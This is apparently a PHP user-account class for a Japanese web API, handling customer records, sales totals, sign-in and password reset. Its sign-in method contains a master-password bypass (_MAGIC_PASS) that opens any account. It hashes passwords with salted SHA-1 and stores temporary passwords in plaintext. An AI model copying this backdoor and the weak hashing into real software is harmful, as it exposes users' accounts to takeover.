<?php
/**
 * ユーザークラス for API3
 * charset utf-8
 *--------------------
 *
 * getUser				顧客情報
 * updateUser			顧客情報を更新
 * salesVolume			売上高
 * isExistEmail			メールアドレスの登録状況確認
 * isValidEmailFormat	メールアドレス（addr_spec）チェック
 * signIn				ログイン
 * getSha1Pass			パスワードの暗号化
 * resetPassword		パスワード再設定
 */
declare(strict_types=1);
namespace package;
require_once $_SERVER['DOCUMENT_ROOT'].'/../cgi-bin/config.php';
require_once $_SERVER['DOCUMENT_ROOT'].'/../cgi-bin/package/db/SqlManager.php';
use \Exception;
use package\db\SqlManager;
class User {

	private $_sql;		// データベースサーバーへの接続を表すオブジェクト
	private $_curDate;	// 抽出条件に使用する日付(0000-00-00)。NULL(default)は今日


	/**
	 * param {string} db データベース名
	 * param {string} curDate 抽出条件に使用する日付(0000-00-00)。NULL(default)は今日
	 */
	public function __construct(string $db, string $curDate=''){
		$this->_curDate = $this->validDate($curDate);
		$this->_sql = new SqlManager($db);
	}
	
	public function __destruct() {}


	/**
	* 日付の妥当性
	* @param {string} args 日付(0000-00-00)
	* @param {string} def 日付(0000-00-00) 不正値の場合に返す日付
	* @return {string} 日付(0000-00-00)。不正値の場合は今日の日付
	*/
	private function validDate(string $args, string $def=''): string {
		if (empty($args)) {
			$res = empty($def)? date('Y-m-d'): $def;
		} else {
			$res = str_replace("/", "-", $args);
			$d = explode('-', $res);
			if (checkdate($d[1], $d[2], $d[0])===false) {
				$res = empty($def)? date('Y-m-d'): $def;
			}
		}
		return $res;
	}


	/**
	 * 顧客情報
	 * @param {int} id ユーザーID
	 * @reutrn { id, customer_num:K000000|G0000, customername, customerruby, dept, deptruby, zipcode, addr0, addr1, addr2, addr3, addr4,
	 *			tel, tel2, email, email2, fax }
	 */
	public function getUser(int $id): array {
		try{
			$query = "select id, (case when customer.cstprefix='k' then concat('K', lpad(customer.number,6,'0')) else concat('G', lpad(customer.number,4,'0')) end) as customer_num,";
			$query .= " customername, customerruby, company as dept, companyruby as deptruby,";
			$query .= " zipcode, addr0, addr1, addr2, addr3, addr4,";
			$query .= " tel, mobile as tel2, email, mobmail as email2, fax";
			$query .= " from customer";
			$query .= " where id=?";

			$marker = 'i';
			$param[] = $id;
			$rec = $this->_sql->prepared($query, $marker, $param);
			$res = $rec[0];
		}catch(Exception $e){
			$res = array();
		}

		return $res;
	}


	/**
	 * 顧客情報を更新
	 * id は必須
	 * @param {array} args {'id', 'customername', 'customerruby', 'zipcode', 'addr0', 'addr1', 'addr2', 'tel'}
	 * @return {array} ログイン成功時にユーザー登録情報
	 */
	public function updateUser($args): array {
		try{
			if (empty($args['id'])) throw new Exception();
			
			// 登録済みデータを確認
			$rec = $this->getUser((int)$args['id']);
			if (empty($rec)) throw new Exception();
			
			// 引数が空の場合は既存データを使用
			$fields = array('customername', 'customerruby', 'zipcode', 'addr0', 'addr1', 'addr2', 'tel');
			for ($i=0; $i<count($fields); $i++) {
				if (isset($args[$fields[$i]])) continue;
				$args[$fields[$i]] = $rec[$fields[$i]];
			}
			
			$query = "update customer set customername=?, customerruby=?, zipcode=?, addr0=?, addr1=?, addr2=?, tel=? where id=?";
			$marker = 'sssssssi';
			$param = array($args['customername'], $args['customerruby'], $args['zipcode'], $args['addr0'], $args['addr1'], $args['addr2'], $args['tel'], $args['id']);
			$this->_sql->prepared($query, $marker, $param);
			
			$res = $this->getUser((int)$args['id']);
		}catch(Exception $e){
			$res = array();
		}

		return $res;
	}


	/**
	 * パスワードを変更
	 * id, pass は必須
	 * @param {array} args {'id', 'password'}
	 * @return {array} ログイン成功時にユーザー登録情報
	 */
	public function setPassword($args): array {
		try{
			if (empty($args['id']) || empty($args['password'])) throw new Exception();

			// 登録済みデータを確認
			$rec = $this->getUser((int)$args['id']);
			if (empty($rec)) throw new Exception();

			// 登録用に暗号化
			$password = self::getSha1Pass($args['password']);

			$query = 'update customer set password=?, temppass=? where id=?';
			$marker = 'ssi';
			$param = array($password, '', $args['id']);
			$this->_sql->prepared($query, $marker, $param);

			$res = $this->getUser((int)$args['id']);
		}catch(Exception $e){
			$res = array();
		}

		return $res;
	}


	/**
	 * パスワード再設定
	 * @param {string} email メールアドレス
	 * @return {string} 再設定されたパスワード
	 */
	public function resetPassword(string $email): string {
		try{
			if (empty($email) || self::isValidEmailFormat($email)===false) throw new Exception();

			// 10桁の仮パスワード生成
			$tmpPass = substr(self::getSha1Pass(time().mt_rand()), 0, 10);

			// 登録用に暗号化
			$password = self::getSha1Pass($tmpPass);

			$query = 'update customer set password=?, temppass=? where email=?';
			$marker = 'sss';
			$param = array($password, $tmpPass, $email);
			$this->_sql->prepared($query, $marker, $param);
			$res = $tmpPass;
		}catch(Exception $e){
			$res = '';
		}

		return $res;
	}


	/**
	 * 売り上げ高
	 * @param {int} id ユーザーID
	 * @param {string} start 注文確定日による検索開始日（yyyy-mm-dd）
	 * @param {string} end 注文確定日による検索終了日（yyyy-mm-dd）
	 * @reutrn [{ id, customer_num:K000000|G0000, customername, customerruby, dept, deptruby, zipcode, addr0, addr1, addr2, addr3, addr4,
	 * 			total_price:売上合計, order_count:注文回数, repeater:0(１回のみ)|1(複数回注文あり), first_order:初回注文日, recent_order:直近の注文日 }, ...]
	 */
	public function salesVolume(int $id=0, string $start='', string $end=''): array {
		try{
			$query = "select customer_id as id, (case when customer.cstprefix='k' then concat('K', lpad(customer.number,6,'0')) else concat('G', lpad(customer.number,4,'0')) end) as customer_num,";
			$query .= " customername, customerruby, company as dept, companyruby as deptruby,";
			$query .= " zipcode, addr0, addr1, addr2, addr3, addr4,";
			$query .= " tel, mobile as tel2, email, mobmail as email2, fax,";
			$query .= " sum(estimated) as total_price, count(orders.id) as order_count,";
			$query .= " (case when count(orders.id)>1 then 1 else 0 end) as repeater,";
			$query .= " min(schedule2) as first_order, max(schedule2) as recent_order from (orders";
			$query .= " inner join acceptstatus on orders.id=acceptstatus.orders_id)";
			$query .= " inner join customer on orders.customer_id=customer.id";
			$query .= " where created>'2011-06-05' and progress_id=4";
			$query .= " and schedule2 between ? and ?";
			$marker .= 'ss';
			if(!empty($id)){
				$query .= " and customer_id=?";
				$marker .= 'i';
			}
			$query .= " group by customer_id";
			$query .= " order by cstprefix desc, order_count desc, total_price desc";

			$start = $this->validDate($start, '2011-06-05');
			$end = $this->validDate($end);

			$param = array($start, $end);
			if (!empty($id)) {
				$param[] = $id;
			}
			$res = $this->_sql->prepared($query, $marker, $param);

		}catch(Exception $e){
			$res = array();
		}

		return $res;
	}


	/**
	 * メールアドレスの登録状況確認
	 * @param {string} email メールアドレス
	 * @return {bool} 登録済みの場合に{@code true}を返す
	 */
	public function isExistEmail(string $email): bool {
		try{
			if (empty($email) || self::isValidEmailFormat($email)===false) throw new Exception();
			
			$query = 'select count(*) as cnt from customer where email=?';
			$marker = 's';
			$param[] = $email;
			$rec = $this->_sql->prepared($query, $marker, $param);
			$res = $rec[0]['cnt']===0? false: true;
		}catch(Exception $e){
			$res = false;
		}

		return $res;
	}


	/**
	 * メールアドレス（addr_spec）チェック
	 * @param {string} email チェックするメールアドレス
	 * @param {bool} supportPeculiarFormat 昔の携帯電話メールアドレスの形式をサポートするかで使う場合はtrue、使わない場合はfalse
	 * @return {bool} メールアドレスとして妥当な場合に{@code true}を返す
	 */
	public static function isValidEmailFormat(string $email, bool $supportPeculiarFormat=true): bool {
		$wsp              = '[\x20\x09]'; // 半角空白と水平タブ
		$vchar            = '[\x21-\x7e]'; // ASCIIコードの ! から ~ まで
		$quoted_pair      = "\\\\(?:{$vchar}|{$wsp})"; // \ を前につけた quoted-pair 形式なら \ と " が使用できる
		$qtext            = '[\x21\x23-\x5b\x5d-\x7e]'; // $vchar から \ と " を抜いたもの。\x22 は " , \x5c は \
		$qcontent         = "(?:{$qtext}|{$quoted_pair})"; // quoted-string 形式の条件分岐
		$quoted_string    = "\"{$qcontent}+\""; // " で 囲まれた quoted-string 形式。
		$atext            = '[a-zA-Z0-9!#$%&\'*+\-\/\=?^_`{|}~]'; // 通常、メールアドレスに使用出来る文字
		$dot_atom         = "{$atext}+(?:[.]{$atext}+)*"; // ドットが連続しない RFC 準拠形式をループ展開で構築
		$local_part       = "(?:{$dot_atom}|{$quoted_string})"; // local-part は dot-atom 形式 または quoted-string 形式のどちらか
		// ドメイン部分の判定強化
		$alnum            = '[a-zA-Z0-9]'; // domain は先頭英数字
		$sub_domain       = "{$alnum}+(?:-{$alnum}+)*"; // hyphenated alnum をループ展開で構築
		$domain           = "(?:{$sub_domain})+(?:[.](?:{$sub_domain})+)+"; // ハイフンとドットが連続しないように $sub_domain をループ展開
		$addr_spec        = "{$local_part}[@]{$domain}"; // 合成
		// 昔の携帯電話メールアドレス用
		$dot_atom_loose   = "{$atext}+(?:[.]|{$atext})*"; // 連続したドットと @ の直前のドットを許容する
		$local_part_loose = $dot_atom_loose; // 昔の携帯電話メールアドレスで quoted-string 形式なんてあるわけない。たぶん。
		$addr_spec_loose  = "{$local_part_loose}[@]{$domain}"; // 合成
		if($supportPeculiarFormat){
			$regexp = $addr_spec_loose;
		}else{
			$regexp = $addr_spec;
		}
		// \A は常に文字列の先頭にマッチする。\z は常に文字列の末尾にマッチする。
		if(preg_match("/\A{$regexp}\z/", $email)){
			return true;
		}else{
			return false;
		}
	}


	/**
	 * ログイン
	 * @param {string} email
	 * @param {string} password
	 * @return {array} ログイン成功時にユーザー登録情報、それ以外はエラーメッセージ
	 */
	public function signIn(string $email, string $password): array {
		try{
			if (empty($email) || self::isValidEmailFormat($email)===false) throw new Exception('This email has not been registered');
			if (empty($password)) throw new Exception('Enter your password');

			$sha1pass = self::getSha1Pass($password);
			if($sha1pass!=_MAGIC_PASS){
				$query = 'select id from customer where email=? and password=? limit 1';
				$marker = 'ss';
				$param = array($email, $sha1pass);
			} else {
				$query = 'select id from customer where email=? limit 1';
				$marker = 's';
				$param = array($email);
			}
			$rec = $this->_sql->prepared($query, $marker, $param);
			if (count($rec)!==1) throw new Exception('Not registered yet');
			$res = $this->getUser((int)$rec[0]['id']);
		}catch(Exception $e){
			$res = array('error'=>$e->getMessage());
		}

		return $res;
	}


	/**
	 * パスワードの暗号化
	 * @return {string} 暗号化したバイナリーデータ
	 */
	private static function getSha1Pass($s) {
		return sha1(_PASSWORD_SALT.$s);
	}


}
?>